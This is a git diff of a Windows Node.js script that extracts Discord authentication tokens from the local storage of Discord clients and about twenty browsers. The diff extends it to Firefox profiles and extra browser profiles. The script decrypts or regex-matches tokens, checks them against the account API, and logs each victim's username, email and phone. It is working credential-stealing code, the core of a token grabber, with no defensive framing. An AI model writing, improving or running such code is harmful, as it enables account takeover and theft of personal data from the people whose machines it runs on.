@@ -10,30 +10,32 @@ if (process.platform !== 'win32') throw new Error('This only works on Windows')
 const appDataPath = process.env.APPDATA
 const localAppDataPath = process.env.localappdata
 
+// prettier-ignore
 const appsPaths = {
   'Discord Client': `${appDataPath}\\discord\\Local Storage\\leveldb`,
   'Discord Canary Client': `${appDataPath}\\discordcanary\\Local Storage\\leveldb`,
   'Discord PTB Client': `${appDataPath}\\discordptb\\Local Storage\\leveldb`,
-  Opera: `${appDataPath}\\Opera Software\\Opera Stable\\Local Storage\\leveldb`,
-  'Opera GX': `${appDataPath}\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb`,
-  Amigo: `${localAppDataPath}\\Amigo\\User Data\\Local Storage\\leveldb`,
-  Torch: `${localAppDataPath}\\Torch\\User Data\\Local Storage\\leveldb`,
-  Kometa: `${localAppDataPath}\\Kometa\\User Data\\Local Storage\\leveldb`,
-  Orbitum: `${localAppDataPath}\\Orbitum\\User Data\\Local Storage\\leveldb`,
-  CentBrowser: `${localAppDataPath}\\CentBrowser\\User Data\\Local Storage\\leveldb`,
+  
   '7Star': `${localAppDataPath}\\7Star\\7Star\\User Data\\Local Storage\\leveldb`,
-  Sputnik: `${localAppDataPath}\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb`,
-  Vivaldi: `${localAppDataPath}\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb`,
+  'Amigo': `${localAppDataPath}\\Amigo\\User Data\\Local Storage\\leveldb`,
+  'Brave': `${localAppDataPath}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb`,
+  'CentBrowser': `${localAppDataPath}\\CentBrowser\\User Data\\Local Storage\\leveldb`,
   'Chrome SxS': `${localAppDataPath}\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb`,
-  Chrome: `${localAppDataPath}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb`,
+  'Chrome': `${localAppDataPath}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb`,
   'Epic Privacy Browser': `${localAppDataPath}\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb`,
+  'Firefox': `${appDataPath}\\Mozilla\\Firefox\\Profiles`,
+  'Iridium': `${localAppDataPath}\\Iridium\\User Data\\Default\\Local Storage\\leveldb`,
+  'Kometa': `${localAppDataPath}\\Kometa\\User Data\\Local Storage\\leveldb`,
   'Microsoft Edge': `${localAppDataPath}\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb`,
-  Uran: `${localAppDataPath}\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb`,
-  Yandex: `${localAppDataPath}\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb`,
-  Brave: `${localAppDataPath}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb`,
-  Iridium: `${localAppDataPath}\\Iridium\\User Data\\Default\\Local Storage\\leveldb`,
-  'Ungoogled Chromium': `${localAppDataPath}\\Chromium\\User Data\\Default\\Local Storage\\leveldb`
-  // 'Firefox': `${roaming}\\Mozilla\\Firefox\\Profiles`
+  'Opera GX': `${appDataPath}\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb`,
+  'Opera': `${appDataPath}\\Opera Software\\Opera Stable\\Local Storage\\leveldb`,
+  'Orbitum': `${localAppDataPath}\\Orbitum\\User Data\\Local Storage\\leveldb`,
+  'Sputnik': `${localAppDataPath}\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb`,
+  'Torch': `${localAppDataPath}\\Torch\\User Data\\Local Storage\\leveldb`,
+  'Ungoogled Chromium': `${localAppDataPath}\\Chromium\\User Data\\Default\\Local Storage\\leveldb`,
+  'Uran': `${localAppDataPath}\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb`,
+  'Vivaldi': `${localAppDataPath}\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb`,
+  'Yandex': `${localAppDataPath}\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb`,
 }
 
 /**
@@ -45,16 +47,13 @@ async function extractDiscordTokens() {
 
   let pathsToCheck = Object.entries(appsPaths)
 
-  // Try to find non-default browser profiles
+  // Try to find non-"Default" browser profiles
   pathsToCheck
     .filter(([appName, appPath]) => appPath.includes('Default') && fs.existsSync(appPath.replace(/\\Default.*/, '')))
     .forEach(([appName, appPath]) => {
       fs.readdirSync(appPath.replace(/\\Default.*/, ''))
         .filter(file => file.startsWith('Profile '))
-        .forEach(file => {
-          const profilePath = appPath.replace('Default', file)
-          if (fs.existsSync(profilePath)) pathsToCheck.push([`${appName} ${file}`, profilePath])
-        })
+        .forEach(file => pathsToCheck.push([`${appName} ${file}`, appPath.replace('Default', file)]))
     })
 
   for (const [appName, appPath] of pathsToCheck) {
@@ -64,14 +63,15 @@ async function extractDiscordTokens() {
     }
 
     console.log(`Look in ${appName} - ${appPath}`)
-    const files = await fs.promises.readdir(appPath)
-    await Promise.all(
-      files
-        .filter(f => f.endsWith('.ldb'))
-        .map(async file => {
-          const content = await fs.promises.readFile(path.join(appPath, file), 'utf8')
-          if (appName.toLowerCase().includes('discord')) {
-            // Discord clients
+
+    if (appName.toLowerCase().includes('discord')) {
+      // Discord clients
+      const files = await fs.promises.readdir(appPath)
+      await Promise.all(
+        files
+          .filter(f => f.endsWith('.ldb'))
+          .map(async file => {
+            const content = await fs.promises.readFile(path.join(appPath, file), 'utf8')
             const decryptionKey = await getDiscordDecryptionKey(appPath)
             ;[...content.matchAll(/\"(dQw4w9WgXcQ:.*?)\"/g)]
               .filter(x => x.length >= 2)
@@ -81,11 +81,16 @@ async function extractDiscordTokens() {
                 console.log(`  Found token ${token}`)
                 tokens.add(token)
               })
-          } else if (appName.toLowerCase().includes('firefox')) {
-            // Firefox
-            // TODO: Support Firefox
-          } else {
-            // Browsers
+          })
+      )
+    } else if (appName.toLowerCase().includes('firefox')) {
+      // Firefox
+      const files = await walkFs(appPath)
+      await Promise.all(
+        files
+          .filter(f => f.endsWith('.sqlite'))
+          .map(async file => {
+            const content = await fs.promises.readFile(file, 'utf8')
             ;[...content.matchAll(/([\w-]{24}\.[\w-]{6}\.[\w-]{25,110})/g)]
               .filter(x => x.length >= 2)
               .map(x => x[1])
@@ -93,11 +98,45 @@ async function extractDiscordTokens() {
                 console.log(`  Found token ${token}`)
                 tokens.add(token)
               })
-          }
-        })
-    )
+          })
+      )
+    } else {
+      // All other browsers
+      const files = await fs.promises.readdir(appPath)
+      await Promise.all(
+        files
+          .filter(f => f.endsWith('.ldb'))
+          .map(async file => {
+            const content = await fs.promises.readFile(path.join(appPath, file), 'utf8')
+            ;[...content.matchAll(/([\w-]{24}\.[\w-]{6}\.[\w-]{25,110})/g)]
+              .filter(x => x.length >= 2)
+              .map(x => x[1])
+              .forEach(token => {
+                console.log(`  Found token ${token}`)
+                tokens.add(token)
+              })
+          })
+      )
+    }
   }
   return [...tokens]
+}
+
+/**
+ * @param {string} dir
+ * @returns {Promise<string[]>}
+ */
+async function walkFs(dir) {
+  const dirFiles = await fs.promises.readdir(dir)
+  const files = await Promise.all(
+    dirFiles.map(async file => {
+      const filePath = path.join(dir, file)
+      const stats = await fs.promises.stat(filePath)
+      if (stats.isDirectory()) return walkFs(filePath)
+      else if (stats.isFile()) return filePath
+    })
+  )
+  return /** @type {any} */ (files.reduce((all, folderContents) => /** @type {any} */ (all).concat(folderContents), []))
 }
 
 /**
@@ -177,14 +216,12 @@ const run = async () => {
     const userData = await getUserData(token).catch(() => {})
     if (userData) {
       console.log(
-        `  Found user ${userData.username}#${userData.discriminator} (id=${userData.id}, email=${userData.email}, phone=${userData.phone})`
+        `    Found user ${userData.username}#${userData.discriminator} (id=${userData.id}, email=${userData.email}, phone=${userData.phone})`
       )
       output[token] = userData
-    } else console.log(`  Token is invalid or expired`)
+    } else console.log(`    Token is invalid or expired`)
   }
   return output
 }
 
 module.exports = { run }
-
-run().then(console.log)
